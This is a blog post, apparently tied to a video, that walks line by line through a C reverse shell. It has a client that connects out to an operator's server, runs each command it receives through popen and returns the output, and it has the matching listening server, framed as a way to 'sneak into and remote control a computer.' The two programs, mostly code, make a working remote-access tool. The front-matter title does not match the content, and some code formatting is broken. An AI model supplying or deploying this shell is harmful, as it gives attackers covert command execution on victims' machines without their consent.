---
title: "Two Forms of Pre-rendering"
date: "2020-01-01"
---

Sneak Into and Remote Control A Computer (Reverse Shell Script) - Line-by-line Explanation
Hi, I’m Wilson! If you haven’t watched the video, please watch it first before reading this blog post!

Sneak Into and Remote Control A Computer (Reverse Shell Script)

```cpp
client.cpp
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PORT (80)
#define BUFFER_SIZE (1024)
#define SEPARATOR ("<SePaRaToR>")
```

The first few lines are just including some necessary header files. Socket will be included in the <arpa/inet.h> file
I later pound-defined some constants.
I specified the port number to be 80.
The buffer size is really just the size of the buffer. It will be used to store data the client receives and store the command output after the client execute the command.
The reason why there is a separator is that every time I sent command output to the server, I’ll append this separator and then append the current working directory (you’ll see why I do this later).

```cpp
int main() {
  int client_fd;
  struct sockaddr_in server_addr;
  char buffer[BUFFER_SIZE];
  char cwd[BUFFER_SIZE];
  FILE *fp;

  client_fd = socket(AF_INET, SOCK_STREAM, 0);

  if (client_fd < 0) {
    perror("socket setup failed\n");
    return -1;
  }
```

I have my main function here.
The first variable, client_fd, is the file descriptor of the socket (it basically represents a socket).
I have the server address on the next line. It is a struct of sockaddr_in. Structures in C programming basically allow you to refer to multiple variables at the same time.
I now declare two char arrays for buffer and cwd (current working directory).
AF_INET means that we will be using IPv4. If we want to use IPv6, it will be AF_INET6 instead. AF stands for the address family.
SOCK_STREAM means that we will be using TCP (Transmission Control Protocol). If we want to use UDP (User Datagram Protocol), we will be using SOCK_DGRAM instead.
If the file descriptor (client_fd) is less than 0, I know that the socket setup failed.
server_addr.sin_family = AF_INET;
inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr);
server_addr.sin_port = htons(PORT);
inet_pton(): this function converts the char array (”127.0.0.1”) into a network address in the address family passed in as the first argument (AF_INET) and copies the address to the third argument (server_addr.sin_addr). Keep in mind that the destination is written in network byte order. If you don’t know what network byte order is, it is a byte order people agree on for network transmission. The reason why people do this is that there are little-endian and big-endian systems. If a little-endian system is trying to send data to a big-endian system, it is likely that the data will be corrupted or unreadable by the big-endian system, since the byte order is backward.
htons(): this function converts the unsigned short integer, which is our port, into network byte order.
if (connect(client_fd, (struct sockaddr \*) &server_addr, sizeof(server_addr)) < 0) {
perror("connection failed\n");
return -1;
}
This is just connecting to the server using what we have so far
client_fd: client socket
server_addr: server address (remember this is a structure, it also contains our port number)
sizeof(server_addr): the size of server_addr
getcwd(cwd, BUFFER_SIZE);
if (send(client_fd, cwd, BUFFER_SIZE, 0) < 0) {
perror("send cwd failed");
return -1;
}
getcwd(): this function gets the current working directory
we then send the current working directory to the server
while (1) {
memset(buffer, 0, BUFFER_SIZE);
if (recv(client_fd, buffer, BUFFER_SIZE, 0) < 0) {
perror("recv failed\n");
return -1;
}
memset(): this function empty the buffer. We need to do this because the data we received last time will persist in the buffer char array
we now receive data from the server and store the data in the buffer
if (strncmp(buffer, "cd", 2) == 0) {
strcpy(cwd, &buffer[3]);
cwd[strlen(&buffer[2])] = '\0';
if (chdir(cwd)) {
perror("change directory failed");
char chdir_fail_mesg[] = "Change Directroy Failed\n";
strcpy(buffer, chdir_fail_mesg);
buffer[strlen(chdir_fail_mesg)] = '\0';
}
getcwd(cwd, BUFFER_SIZE);
strcat(buffer, "\n");
strcat(buffer, SEPARATOR);
strcat(buffer, cwd);
if (send(client_fd, buffer, BUFFER_SIZE, 0) < 0) {
perror("send failed");
return -1;
}
}
this if statement is used to check if the input data is a cd command. If it is the case, we want to change the directory and store the current directory back in cwd char array.
we then send the buffer back to the server with the separator and cwd at the end
the first two lines are simply just grabbing whatever that is after “cd ” and storing it in the cwd char array
I then try to change the current working directory using the chdir() function.
if this fails I’m going to store an error message in the buffer so that the server will be notified
next line I get the current working directory and store it in cwd
I now concatenate the char array with a new line character (”\n”), the separator, and the current working directory
In the end, I send this buffer to the server
else {
if (chdir(cwd)) {
perror("change directory failed");
return -1;
}
fp = popen(buffer, "r");
if (!fp) {
perror("peopen failed");
}
memset(buffer, 0, BUFFER_SIZE);

    while (true) {
      char line[BUFFER_SIZE];
      int status = fscanf(fp, "%[^\n]%*c", line);
      if (status != 1) {
        break;
      }
      strcat(buffer, line);
      strcat(buffer, "\n");
    }

so if the command does not start with cd (not a change directory command), we will be executing the command and sending the output back to the server
we first want to change the current working directory using what we have in the cwd variable
popen() allows me to execute commands. The “r” at the end means that I’m able to read the output of the command. We will store this to the file pointer (fp) we defined in the beginning
we now empty the buffer char array and use the while loop below to store the command output back in the buffer array
strcat(buffer, SEPARATOR);
strcat(buffer, cwd);

      printf("%s\n", buffer);
      if (send(client_fd, buffer, BUFFER_SIZE, 0) < 0) {
        perror("send failed");
        return -1;
      }
      pclose(fp);
    }

}
}
in the end, I’m going to append the separator, cwd, and send the buffer back to the server
server.cpp
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFFER_SIZE (1024)
#define BACKLOG (3)
#define SEPARATOR ("<SePaRaToR>")
This part is almost the same as the client, but we pound-define BACKLOG. You’ll see why later
int main(int argc, char \*argv[]) {
int server_fd;
int client_fd;
struct sockaddr_in server_addr;
struct sockaddr_in client_addr;

char buffer[BUFFER_SIZE];
char cwd[BUFFER_SIZE];
char output[BUFFER_SIZE];

if (argc != 3) {
perror("please provide the right arguments\n");
return -1;
}

printf("[*] Listening on %s:%s...\n", argv[1], argv[2]);
We now have the main function. As you can see it accept two parameters. The first one, argc, is telling us how many strings are there when the code is executed. For example
./server 127.0.0.1 80 //in this case argc will be 3 (executable name, address, port)
argv will be the array that we can use to access these strings
so argv[0] will be "./server"
argv[1] will be "127.0.0.1"
argv[2] will be "80"
if argc is not 3, we tell the user that they entered the wrong amount of parameter
the buffer char array is used to store the data received from the client
cwd will be used to store the current working directory
we will be getting this from grabbing everything that is after the separator
output will be used to store the command output from the client
we will be getting this from grabbing everything that is before the separator
server_fd = socket(AF_INET, SOCK_STREAM, 0);
if (server_fd <= 0) {
perror("socket setup failed\n");
return -1;
}
we now create a socket for the server
explained AF_INET and SOCK_STREAM in the client section
server_addr.sin_family = AF_INET;
inet_pton(AF_INET, argv[1], &server_addr.sin_addr);
server_addr.sin_port = htons(atoi(argv[2]));
we will be setting up the address just like how we did in the client, but in this case, we will be using the value in argv.
remember argv[1] is the IP address
argv [2] is the port number, the atoi() function converts it from string to int
if (bind(server_fd, (struct sockaddr _) &server_addr, sizeof(server_addr)) < 0) {
perror("bind failed\n");
return -1;
}
we now bind the server socket with the address we just set up
if (listen(server_fd, BACKLOG) < 0) {
perror("listen failed\n");
return -1;
}
we now listen for connections
remember the BACKLOG we pound-defined as 3?
it means that we allow 3 connections but since our program doesn’t handle multiple connections at the same time, the other connections will be waiting in a line.
int client_addr_size = sizeof(client_addr);
client_fd = accept(server_fd, (struct sockaddr _) &client_addr,
(socklen_t _) &client_addr_size);
if (client_fd < 0) {
perror("accept failed\n");
return -1;
}
after we accept the connection, we will be storing the accept return value to our client socket (client_fd)
printf("[_] Connected to %s:%s\n", inet_ntoa(client_addr.sin_addr), argv[2]);

if (recv(client_fd, cwd, BUFFER_SIZE, 0) < 0) {
perror("recv cwd failed\n");
return -1;
}
we now print out the client's address
inet_ntoa() converts the network address in network byte order to string
we later receive the current working directory from the client
while (1) {
memset(buffer, 0, BUFFER_SIZE);
memset(output, 0, BUFFER_SIZE);

    printf("%s> ", cwd);
    scanf("%511[^\n]%*c", buffer);

    if (send(client_fd, buffer, BUFFER_SIZE, 0) < 0) {
      perror("send failed");
      return -1;
    }

we now have a while loop just like what we have in the client
the first two lines will be emptying the buffer and output char array
we then print out the current working directory and scan for the user input command and store it in the buffer char array
after that, we will send that command to the client
if (recv(client_fd, buffer, BUFFER_SIZE, 0) < 0) {
perror("recv failed\n");
return -1;
}

    char *separator = strstr(buffer, SEPARATOR);
    char *new_cwd = separator + strlen(SEPARATOR);

    strcpy(cwd, new_cwd);
    cwd[strlen(new_cwd) + 1] = '\0';

    memcpy(output, buffer, separator - buffer);
    printf("%s", output);

}

return 0;
}
when the client responds, we receive the output of the command and store it in the buffer char array
we get the char pointer to the separator using the strstr function
strstr() returns the char pointer where this passed in substring exist
In the next line, I did pointer arithmetic, which moves the pointer strlen(SEPARATOR) bytes forward to point to the beginning of the cwd
remember the data sent by the client is formatted like this
[command output][separator][cwd]
we now copy the cwd from the client to the cwd char array
after that, we grab everything before separator and put it in the output char array using the memcpy function
and then we print out the output
This is basically it! I know there is a lot going on, but hope you find this blog post helpful! :D
